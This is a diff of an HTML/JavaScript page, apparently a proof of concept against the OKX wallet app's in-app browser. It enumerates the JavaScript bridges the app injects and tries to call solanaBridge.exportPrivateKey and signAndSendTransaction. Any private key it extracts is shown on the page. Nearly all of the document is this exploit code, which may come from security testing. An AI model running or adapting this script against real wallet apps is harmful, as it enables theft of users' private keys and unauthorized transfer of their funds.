@@ -2,88 +2,91 @@
 <head><meta charset="UTF-8">
 <style>
 body{background:#1a1a2e;color:#eee;font-family:monospace;padding:20px}
-.green{color:#0f0}.red{color:#e94560}.yellow{color:#ffa500}.info{color:#8899aa}
-#log{background:#16213e;padding:15px;border-radius:8px;line-height:1.8;font-size:14px}
+.g{color:#0f0}.r{color:#e94560}.y{color:#ffa500}.i{color:#8899aa}
+#log{background:#16213e;padding:15px;border-radius:8px;line-height:1.8;font-size:13px}
 </style></head>
 <body>
-<h2>OKX Security Test</h2>
-<div id="status">Initializing...</div>
+<h2>OKX Bridge Scanner</h2>
+<div id="s">Scanning...</div>
 <div id="log"></div>
 <script>
 (function(){
     var el = document.getElementById('log');
-    var st = document.getElementById('status');
-    function log(cls, msg) { el.innerHTML += '<span class="'+cls+'">'+msg+'</span><br>'; }
+    var st = document.getElementById('s');
+    function l(cls, msg) { el.innerHTML += '<span class="'+cls+'">'+msg+'</span><br>'; }
 
-    // 先用 try/catch 包住全部，防止任何 JS 错误使页面空白
     try {
-        // Step 1: 检查桥是否存在
-        var bridgeReady = (typeof solanaBridge !== 'undefined');
-        var solanaReady = (typeof window.solana !== 'undefined');
-        var svmReady = (typeof window.svm !== 'undefined');
+        // 枚举 window 上所有对象 - 找 bridge 相关
+        l('i', '[*] Scanning window objects...');
+        var bridges = [];
+        var allKeys = Object.keys(window);
+        l('i', '    Total window keys: ' + allKeys.length);
 
-        log('info', 'Bridge check: solanaBridge=' + bridgeReady + ' solana=' + solanaReady + ' svm=' + svmReady);
+        // 搜索已知桥名
+        var knownBridges = [
+            'solanaBridge', 'solana', 'svm', '_solana_', '_solana',
+            'okxwallet', 'okx', 'walletBridge', 'WalletBridge',
+            'Android', 'android', 'JSBridge', 'jsBridge', 'web3',
+            'ethereum', 'ethers', 'provider', 'wallet', 'bridge'
+        ];
 
-        st.innerHTML = 'Bridge: ' + (bridgeReady ? '✅' : '❌') + ' solana: ' + (solanaReady ? '✅' : '❌') + ' svm: ' + (svmReady ? '✅' : '❌');
-
-        // Step 2: 如果有 solanaBridge，枚举所有方法
-        if(bridgeReady) {
-            st.innerHTML = '✅ solanaBridge available! Testing methods...';
-            log('green', '[+] solanaBridge methods:');
-
-            // 枚举可调用的方法
-            var methods = [];
-            for(var m in solanaBridge) {
-                if(typeof solanaBridge[m] === 'function') methods.push(m);
+        for(var k in window) {
+            var kLower = k.toLowerCase();
+            if(kLower.indexOf('bridge') >= 0 || kLower.indexOf('wallet') >= 0 ||
+               kLower.indexOf('solana') >= 0 || kLower.indexOf('ethereum') >= 0 ||
+               kLower.indexOf('web3') >= 0 || kLower.indexOf('okx') >= 0) {
+                bridges.push({name:k, type:typeof window[k]});
             }
-            log('info', '    ' + methods.join(', '));
+        }
 
-            // Step 3: 尝试 exportPrivateKey - 同步方式
-            log('info', '[>] Trying exportPrivateKey (sync)...');
-            try {
-                var keyResult = solanaBridge.exportPrivateKey("");
-                log('green', '[!!!] SYNC RESULT: ' + JSON.stringify(keyResult));
-            } catch(e) {
-                log('red', '[-] sync error: ' + e.message);
+        l('g', '[+] Bridge-like objects found: ' + bridges.length);
+        bridges.forEach(function(b) {
+            var extra = '';
+            if(b.type === 'object' || b.type === 'function') {
+                try {
+                    var methods = Object.keys(window[b.name]).filter(function(m) {
+                        return typeof window[b.name][m] === 'function';
+                    });
+                    extra = ' methods: ' + methods.join(',');
+                } catch(e) {}
             }
+            l('g', '    ' + b.name + ' (' + b.type + ')' + extra);
+        });
 
-            // Step 4: 尝试 exportPrivateKey - 异步方式
-            log('info', '[>] Trying exportPrivateKey (async)...');
-            solanaBridge.exportPrivateKey("").then(function(key) {
-                log('green', '[!!!] ASYNC KEY: ' + key);
-                st.innerHTML = '✅✅✅ PRIVATE KEY: ' + key;
-                st.style.fontSize = '18px';
-            }).catch(function(e) {
-                log('red', '[-] async error: ' + e.message);
-                st.innerHTML = '⚠️ Bridge works but exportPrivateKey failed: ' + e.message;
-            });
-
-            // Step 5: 尝试 signAndSendTransaction
-            log('info', '[>] Trying signAndSendTransaction...');
-            solanaBridge.signAndSendTransaction(JSON.stringify({to:'0xTest',amount:'0.001',token:'SOL'})).then(function(tx) {
-                log('green', '[!!!] TX: ' + JSON.stringify(tx));
-            }).catch(function(e) {
-                log('red', '[-] signAndSend error: ' + e.message);
-            });
+        // 尝试调 solanaBridge (如果有)
+        if(typeof solanaBridge !== 'undefined') {
+            l('g', '[+] solanaBridge found! Testing...');
+            try { var k = solanaBridge.exportPrivateKey(""); l('g', '[!!!] KEY: ' + k); st.innerHTML = '✅ KEY: ' + k; } catch(e) { l('r', '    exportPrivateKey error: ' + e.message); }
+            try { var t = solanaBridge.signAndSendTransaction('{"to":"0xTest","amount":"0.001","token":"SOL"}'); l('g', '[!!!] TX: ' + JSON.stringify(t)); } catch(e) { l('r', '    signAndSend error: ' + e.message); }
         }
 
-        // Step 6: window.solana 信息
-        if(solanaReady) {
-            log('green', '[+] window.solana.autoApprove: ' + window.solana.autoApprove);
-            log('green', '[+] window.solana.isDebug: ' + window.solana.isDebug);
-        }
-        if(svmReady) {
-            log('green', '[+] window.svm.autoApprove: ' + window.svm.autoApprove);
+        // 尝试 solana (window.solana)
+        if(typeof window.solana !== 'undefined') {
+            l('g', '[+] window.solana: autoApprove=' + window.solana.autoApprove + ' isDebug=' + window.solana.isDebug);
         }
 
-        if(!bridgeReady && !solanaReady && !svmReady) {
-            st.innerHTML = '❌ No bridges found. Wrong WebView context.';
+        if(typeof window.svm !== 'undefined') {
+            l('g', '[+] window.svm: autoApprove=' + window.svm.autoApprove);
+        }
+
+        // 尝试 okxwallet
+        if(typeof window.okxwallet !== 'undefined') {
+            l('g', '[+] window.okxwallet found');
+            if(window.okxwallet.solana) l('g', '    okxwallet.solana.autoApprove=' + window.okxwallet.solana.autoApprove);
+        }
+
+        // 结果
+        if(bridges.length === 0) {
+            st.innerHTML = '❌ No DApp bridges found. Not in DApp WebView.';
             st.style.color = '#e94560';
+        } else {
+            st.innerHTML = '✅ Scan complete - see bridges above';
+            st.style.color = '#0f0';
         }
 
     } catch(e) {
-        log('red', '[FATAL] ' + e.message);
-        st.innerHTML = '❌ Script error: ' + e.message;
+        l('r', '[FATAL] ' + e.message);
+        st.innerHTML = '❌ Error: ' + e.message;
     }
 })();
 </script>
